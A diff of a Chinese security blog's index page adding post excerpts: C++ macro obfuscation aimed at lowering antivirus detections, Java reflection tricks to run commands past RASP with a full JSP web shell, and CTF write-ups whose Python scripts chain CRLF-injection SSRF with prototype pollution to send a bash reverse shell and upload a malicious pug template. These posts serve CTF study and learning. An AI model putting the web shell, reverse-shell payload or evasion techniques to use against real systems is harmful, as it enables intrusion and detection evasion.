@@ -172,6 +172,84 @@
         
 
 <div class="post">
+    <a href="/2024/03/26/%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86/">
+        <h2 class="post-title">源码混淆</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/3/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="c-源码混淆"><a href="#c-源码混淆" class="headerlink" title="c++源码混淆"></a>c++源码混淆</h1><p>ollvm VT 14 &#x2F; 72</p>
+<p>直接编译  10 &#x2F; 72 </p>
+<p>是ollvm特征太明显了还是什么原因吗?</p>
+<p>那么研究研究手动混淆 </p>
+<h2 id="函数名及变量名的混淆"><a href="#函数名及变量名的混淆" class="headerlink" title="函数名及变量名的混淆"></a>函数名及变量名的混淆</h2><p>使用宏替换（#define）就可以了</p>
+<pre><code class="cpp">#ifndef _OBFUS_H_
+#define _OBFUS_H_
+
+#define OBFUSCATION_CODE
+#ifdef OBFUSCATION_CODE
+
+//main.cpp
+#define md5sum                            l1o
+#define md5_value                         l10
+#define func_val                          l11
+#define func_val                          l12
+#define func_val                          l13
+#define func_val                          l14
+#define func_val                          l15
+#define func_val                          l16
+#define func_val                          l17
+#define func_val                          l18
+#define func_val                          l19
+//other.cpp
+#define func_val                          l1lo
+#define func_val                          l1l0
+#define func_val                          l1l1
+#define func_val                          l1l2
+#define func_val                          l1l3
+#define func_val                          l1l4
+#define func_val                          l1l5
+#define func_val                          l1l6
+#define func_val                          l1l7
+#define func_val                          l1l8
+#define func_val                          l1l9
+
+#endif //OBFUSCATION_CODE
+#endif //_OBFUS_H_
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/evasion/" style="color: #00a596">evasion</a>
+        </span>
+        
+    </div>
+    <a href="/2024/03/26/%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/03/19/Ubuntu20.04%20%E9%85%8D%E7%BD%AEOLLVM%E7%8E%AF%E5%A2%83/">
         <h2 class="post-title">OLLVM</h2>
     </a>
@@ -276,7 +354,7 @@ int main(int argc,char *argv[])&#123;
         
         <span class="tag">
             
-            <a href="/tags/evasion/" style="color: #03a9f4">evasion</a>
+            <a href="/tags/evasion/" style="color: #ff7d73">evasion</a>
         </span>
         
     </div>
@@ -735,7 +813,7 @@ javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/java/" style="color: #00a596">java</a>
         </span>
         
     </div>
@@ -1117,7 +1195,7 @@ public class CC6 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00a596">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
@@ -1410,7 +1488,7 @@ public class CC4 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ffa2c4">java</a>
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
         </span>
         
     </div>
@@ -1589,7 +1667,7 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00a596">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
@@ -1997,7 +2075,7 @@ public class CC1LazyVersion &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00a596">java</a>
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
         </span>
         
     </div>
@@ -2034,13 +2112,468 @@ public class CC1LazyVersion &#123;
     <a href="/2024/02/24/test/" class="go-post">阅读全文</a>
 </div>
 
+<div class="post">
+    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+        <h2 class="post-title">JavaSec基础命令执行</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>记录<a target="_blank" rel="noopener" href="https://github.com/javaweb-sec/javaweb-sec%E7%9A%84%E5%AD%A6%E4%B9%A0">https://github.com/javaweb-sec/javaweb-sec的学习</a></p>
+<h1 id="CommandExecute"><a href="#CommandExecute" class="headerlink" title="CommandExecute"></a>CommandExecute</h1><p>Runtime#exec</p>
+<p>ProcessBuilder#start</p>
+<p>以上两个最终都要调到ProcessImpl</p>
+<p>而ProcessImpl会调用native的forkAndExec</p>
+<p>实际最终都是调到Java_java_lang_ProcessImpl_forkAndExec</p>
+<p>而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p>
+<p>但是我本地跟了一下 最终调的是Java_java_lang_ProcessImpl_create  并没有找到 Java_java_lang_ProcessImpl_forkAndExec</p>
+<p>在linux下有forkAndExec</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/80348e9d2a819916527fcb258707602d.png" alt="image-20240127135535440"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/595ea11cea97f3b0f654478d5b51d189.png" alt="image-20240127135551312"></p>
+<pre><code class="cpp">Java_java_lang_ProcessImpl_create(JNIEnv *env, jclass ignored,
+                                  jstring cmd,
+                                  jstring envBlock,
+                                  jstring dir,
+                                  jlongArray stdHandles,
+                                  jboolean redirectErrorStream)
+&#123;
+    jlong ret = 0;
+    if (cmd != NULL &amp;&amp; stdHandles != NULL) &#123;
+        const jchar *pcmd = (*env)-&gt;GetStringChars(env, cmd, NULL);
+        if (pcmd != NULL) &#123;
+            const jchar *penvBlock = (envBlock != NULL)
+                ? (*env)-&gt;GetStringChars(env, envBlock, NULL)
+                : NULL;
+            const jchar *pdir = (dir != NULL)
+                ? (*env)-&gt;GetStringChars(env, dir, NULL)
+                : NULL;
+            jlong *handles = (*env)-&gt;GetLongArrayElements(env, stdHandles, NULL);
+            if (handles != NULL) &#123;
+                ret = processCreate(
+                    env,
+                    pcmd,
+                    penvBlock,
+                    pdir,
+                    handles,
+                    redirectErrorStream);
+                (*env)-&gt;ReleaseLongArrayElements(env, stdHandles, handles, 0);
+            &#125;
+            if (pdir != NULL)
+                (*env)-&gt;ReleaseStringChars(env, dir, pdir);
+            if (penvBlock != NULL)
+                (*env)-&gt;ReleaseStringChars(env, envBlock, penvBlock);
+            (*env)-&gt;ReleaseStringChars(env, cmd, pcmd);
+        &#125;
+    &#125;
+    return ret;
+&#125;
+</code></pre>
+<p>这里就不写Runtime和ProcessBuilder的了</p>
+<h2 id="反射ProcessImpl命令执行"><a href="#反射ProcessImpl命令执行" class="headerlink" title="反射ProcessImpl命令执行"></a>反射ProcessImpl命令执行</h2><pre><code class="java">package tem;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+public class Exec &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;
+        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
+        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
+        startMethod.setAccessible(true);
+        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
+    &#125;
+&#125;
+</code></pre>
+<p>高版本则需要用Unsafe绕过</p>
+<pre><code class="java">package tem;
+
+import sun.misc.Unsafe;
+
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+public class Exec &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException &#123;
+        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
+        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
+
+        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+        unsafeField.setAccessible(true);
+        Unsafe unsafe = (Unsafe) unsafeField.get(null);
+        Class cureentClass = Exec.class;
+
+        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());
+
+
+        startMethod.setAccessible(true);
+        startMethod.invoke(null,new String[]&#123;&quot;calc&quot;&#125;,null,null,null,false);
+    &#125;
+&#125;
+</code></pre>
+<h2 id="反射Java-java-lang-ProcessImpl-create命令执行"><a href="#反射Java-java-lang-ProcessImpl-create命令执行" class="headerlink" title="反射Java_java_lang_ProcessImpl_create命令执行"></a>反射Java_java_lang_ProcessImpl_create命令执行</h2><p>当ProcessImpl也不能用的时候可以考虑</p>
+<p>过程如下</p>
+<ol>
+<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>ProcessImpl</code>类对象。</li>
+<li>反射<code>ProcessImpl</code>类的<code>create</code>方法。</li>
+<li>构造<code>create</code>需要的参数并调用。</li>
+</ol>
+<pre><code class="java">package tem;
+
+import sun.misc.Unsafe;
+
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class NativeExec &#123;
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;
+        // 获取ProcessImpl的实例
+        Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+        unsafeField.setAccessible(true);
+        Unsafe unsafe = (Unsafe) unsafeField.get(null);
+        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);
+        Object o = unsafe.allocateInstance(clazz);
+
+        Method createMethod = clazz.getDeclaredMethod(&quot;create&quot;, String.class, String.class, String.class, long[].class, boolean.class);
+
+        Class cureentClass = NativeExec.class;
+        unsafe.getAndSetObject(cureentClass,unsafe.objectFieldOffset(Class.class.getDeclaredField(&quot;module&quot;)),Object.class.getModule());
+
+        createMethod.setAccessible(true);
+//        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructor(String[].class,String.class,String.class,long[].class,boolean.class,boolean.class);
+//        declaredConstructor.setAccessible(true);
+//        System.out.println(declaredConstructor);
+//        Object p = declaredConstructor.newInstance(new String[]&#123;&quot;calc&quot;&#125;, null, null, new long[]&#123;-1L,-1L,-1L&#125;, false, false);
+//        System.out.println(p);
+        createMethod.invoke(null,
+                &quot;calc&quot;,
+                null,
+                null,
+                new long[]&#123;-1L,-1L,-1L&#125;,
+                false);
+
+
+
+    &#125;
+&#125;
+</code></pre>
+<p>在linux下则是<code>forkAndExec</code> 这个直接抄了</p>
+<p>过程如下</p>
+<ol>
+<li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li>
+<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li>
+<li>构造<code>forkAndExec</code>需要的参数并调用。</li>
+<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li>
+<li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li>
+</ol>
+<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;sun.misc.Unsafe&quot; %&gt;
+&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;
+&lt;%!
+    byte[] toCString(String s) &#123;
+        if (s == null)
+            return null;
+        byte[] bytes  = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0,
+                result, 0,
+                bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
+    &#125;
+
+
+%&gt;
+&lt;%
+    String[] strs = request.getParameterValues(&quot;cmd&quot;);
+
+    if (strs != null) &#123;
+        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+        theUnsafeField.setAccessible(true);
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+
+        Class processClass = null;
+
+        try &#123;
+            processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);
+        &#125; catch (ClassNotFoundException e) &#123;
+            processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);
+        &#125;
+
+        Object processObject = unsafe.allocateInstance(processClass);
+
+        // Convert arguments to a contiguous block; it&#39;s easier to do
+        // memory management in Java than in C.
+        byte[][] args = new byte[strs.length - 1][];
+        int      size = args.length; // For added NUL bytes
+
+        for (int i = 0; i &lt; args.length; i++) &#123;
+            args[i] = strs[i + 1].getBytes();
+            size += args[i].length;
+        &#125;
+
+        byte[] argBlock = new byte[size];
+        int    i        = 0;
+
+        for (byte[] arg : args) &#123;
+            System.arraycopy(arg, 0, argBlock, i, arg.length);
+            i += arg.length + 1;
+            // No need to write NUL bytes explicitly
+        &#125;
+
+        int[] envc                 = new int[1];
+        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;
+        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);
+        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);
+        launchMechanismField.setAccessible(true);
+        helperpathField.setAccessible(true);
+        Object launchMechanismObject = launchMechanismField.get(processObject);
+        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
+
+        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);
+
+        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;
+                int.class, byte[].class, byte[].class, byte[].class, int.class,
+                byte[].class, int.class, byte[].class, int[].class, boolean.class
+        &#125;);
+
+        forkMethod.setAccessible(true);// 设置访问权限
+
+        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;
+                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
+                null, envc[0], null, std_fds, false
+        &#125;);
+
+        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
+        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);
+        initStreamsMethod.setAccessible(true);
+        initStreamsMethod.invoke(processObject, std_fds);
+
+        // 获取本地执行结果的输入流
+        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);
+        getInputStreamMethod.setAccessible(true);
+        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        int                   a    = 0;
+        byte[]                b    = new byte[1024];
+
+        while ((a = in.read(b)) != -1) &#123;
+            baos.write(b, 0, a);
+        &#125;
+
+        out.println(&quot;&lt;pre&gt;&quot;);
+        out.println(baos.toString());
+        out.println(&quot;&lt;/pre&gt;&quot;);
+        out.flush();
+        out.close();
+    &#125;
+%&gt;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%AE%A1/" style="color: #ffa2c4">代码复审</a>
+        </span>
+        
+    </div>
+    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/01/11/%E3%80%90%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202022%E3%80%91real_ez_node%20%E5%A4%8D%E7%9B%98/">
+        <h2 class="post-title">【西湖论剑 2022】real_ez_node 复盘</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/11
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>半年前说要学node 到现在还是b动静没有</p>
+<h1 id="西湖论剑-2022-real-ez-node"><a href="#西湖论剑-2022-real-ez-node" class="headerlink" title="[西湖论剑 2022]real_ez_node"></a>[西湖论剑 2022]real_ez_node</h1><p>给了源码 node8.1.2<br>初步看下来要ssrf打原型链污染<br>&#x2F;路由下是<code>this is ejs</code><br>可以往ejs的原型链污染去考虑</p>
+<p>但是问题来了<br>上哪儿去ssrf<br>&#x2F;curl路由只有参数q可控<br><img src="https://img-blog.csdnimg.cn/direct/8a843cd75bef4e78a75c81ce08b9fba1.png" alt="在这里插入图片描述"><br>考虑CRLF拆分攻击<br><img src="https://img-blog.csdnimg.cn/direct/0dfba27b3d2743ed899931ce9e02ed32.png" alt="在这里插入图片描述"><br>污染点在<br><img src="https://img-blog.csdnimg.cn/direct/b869e8c7b7f84993a0509f454af8a2c8.png" alt="在这里插入图片描述"><br>手动POST &#x2F;copy<br>拿到数据包删掉点无关紧要的东西<br>然后就可以构造了<br><code>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2</code></p>
+<pre><code class="py">import urllib.parse
+import requests
+
+payload = &#39;&#39;&#39;HTTP/1.1
+
+POST /copy HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+Content-Length: 192
+
+&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;
+
+GET /&#39;&#39;&#39;
+payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
+    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)
+
+
+payload = urllib.parse.quote(payload)
+
+print(payload)
+url = &quot;http://node4.anna.nssctf.cn:28814/curl?q=&quot;
+requests.get(url+payload)
+</code></pre>
+<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>这里顺便给[GYCTF2020]Node Game做了<br><img src="https://img-blog.csdnimg.cn/direct/47c756b052304c6383cfc905ecd55ef4.png" alt="在这里插入图片描述"><br>模板是pug<br>&#x2F;core可以ssrf<br>&#x2F;file_upload有一个文件上传<br>根路径下传action参数可以访问任意模板</p>
+<p>那么可以考虑上传一个恶意的pug然后根目录去访问<br><img src="https://img-blog.csdnimg.cn/direct/a9724e2e618543718d45ea2641c48dc8.png" alt="在这里插入图片描述"><br>上传路径在uploads下 可以通过构造mimetype来路径穿越</p>
+<p>先抓一个上传的包</p>
+<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
+- return x
+</code></pre>
+<p>完事改脚本</p>
+<pre><code class="py">import urllib.parse
+import requests
+
+# payload = &#39;&#39;&#39;HTTP/1.1
+
+# POST /file_upload HTTP/1.1
+# Host: 127.0.0.1:8081
+# Content-Length: 331
+# Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCOrILUaqwgT7T9GT
+
+# ------WebKitFormBoundaryCOrILUaqwgT7T9GT
+# Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
+# Content-Type: ../template
+
+# -var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)
+# -return x
+# ------WebKitFormBoundaryCOrILUaqwgT7T9GT--
+
+# GET /&#39;&#39;&#39;
+payload =&#39;&#39;&#39;HTTP/1.1
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA
+Content-Length: 301
+Host: 127.0.0.1:8081
+
+------WebKitFormBoundaryO9LPoNAg9lWRUItA
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
+Content-Type: ../template
+
+- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
+- return x
+------WebKitFormBoundaryO9LPoNAg9lWRUItA--
+
+
+GET /&#39;&#39;&#39;
+payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
+    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)
+
+
+payload = urllib.parse.quote(payload)
+
+
+url = &quot;http://4b5ed9ad-6e1e-4336-91a3-4bffc35ea376.node5.buuoj.cn:81/core?q=&quot;
+print(url+payload)
+res = requests.get(url+payload)
+print(res.text)
+
+</code></pre>
+<p>此时访问&#x2F;?action&#x3D;shell<br><img src="https://img-blog.csdnimg.cn/direct/cf0c6324b4b3480fba39e1fa24c7b81f.png" alt="在这里插入图片描述"><br>修改pug</p>
+<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat f*&#39;)&quot;)
+- return x
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/direct/9cf32449b61c47eaaf37ace260ee67ab.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/node-js/" style="color: #ffa2c4">node.js</a>
+        </span>
+        
+    </div>
+    <a href="/2024/01/11/%E3%80%90%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202022%E3%80%91real_ez_node%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
+</div>
+
 
         <div class="page-current">
     
     <span class="current">1</span>
     
+    <a class="page-num" href="/page/2">2</a>
     
     
+    <a class="page-num" href="/page/3">3</a>
+    
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/7">7</a>
+    
+    
+    <a class="page-num" href="/page/2/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
     
 </div>
 
